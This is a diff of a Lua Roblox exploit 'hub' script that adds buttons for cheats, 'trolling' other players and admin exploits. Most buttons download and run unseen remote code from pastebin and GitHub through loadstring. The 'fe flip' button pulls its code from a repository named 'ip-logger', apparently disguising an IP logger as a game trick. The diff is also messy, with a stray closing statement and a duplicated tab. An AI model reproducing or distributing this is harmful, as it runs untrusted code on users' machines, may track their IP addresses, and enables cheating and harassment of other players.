@@ -1,20 +1,30 @@
---also update it AND ADD THE OBBYS WHAT I GAVE BIRTH TO
-
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Obby creator hub           MADY BY HAXAREBEST1", "DarkTheme")
 local Tab = Window:NewTab("Main")
-local Section = Tab:NewSection("TROLL THESE NOOBS")
-
-
--- WEBSITE DELETED IT RECREATE IT NOOB
-Section:NewButton("antivoid", "  ", function()
+local Section = Tab:NewSection("antivoid also known as platform")
+Section:NewButton("Platform", "  ", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/bEWQXXMg"))();
 print("Clicked")
 end)
-
-
-
-
+local Section = Tab:NewSection("FOV CHANGER")
+Section:NewButton("FOV changer", "changes your fov size", function()
+Game.Workspace.Camera.FieldOfView = 200
+print("Clicked")
+end)
+local Section = Tab:NewSection("only you can see the obbies")
+Section:NewButton("obby 1 at cannon 1", "changes your fov size", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thiccnegative123/obby-creator/refs/heads/main/obby%20creator%20obby%20at%20cannon%201"))();
+print("Clicked")
+end)
+Section:NewButton("obby 2 at cannon 2", "changes your fov size", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thiccnegative123/obby-creator/refs/heads/main/obby%20creator%20obby%20at%20cannon%202"))();
+print("Clicked")
+end)
+Section:NewButton("obby 3 at the middle", "changes your fov size", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thiccnegative123/obby-creator/refs/heads/main/obby%20creator%20(middle%20obby)"))();
+print("Clicked")
+end)
+local Section = Tab:NewSection("THE END OF MY SELF MADE SCRIPTS")
 local Tab = Window:NewTab("Admin scripts")
 local Section = Tab:NewSection("FREE ADMIN")
 Section:NewButton("infinite yield", "FREE ADMIN", function()
@@ -34,6 +44,21 @@ end)
 local Section = Tab:NewSection("Open/close")
 Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.F, function()
 Library:ToggleUI()
+end)
+local Tab = Window:NewTab("Trolling")
+local Section = Tab:NewSection("GO TROLL THEM")
+Section:NewButton("fe ball roll", "be a ball in ohio", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/BZr9bGDy", true))()
+print("Clicked")
+end)
+Section:NewButton("fe flip", "flip like a oto!!1!1", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thiccnegative123/ip-logger/refs/heads/main/fe%20flip"))();
+print("Clicked")
+end)
+local Tab = Window:NewTab("CrEdIts")
+local Section = Tab:NewSection("MADE BY HAXAREBEST2")
+local Section = Tab:NewSection("i was kinda lazy making thus script lol")
+local Section = Tab:NewSection("I MADE THE PLATFORM SCRIPT,FOV CHANGER AND THE OBBIES NO HELP")
 end)
 local Tab = Window:NewTab("Trolling")
 local Section = Tab:NewSection("GO TROLL THEM")
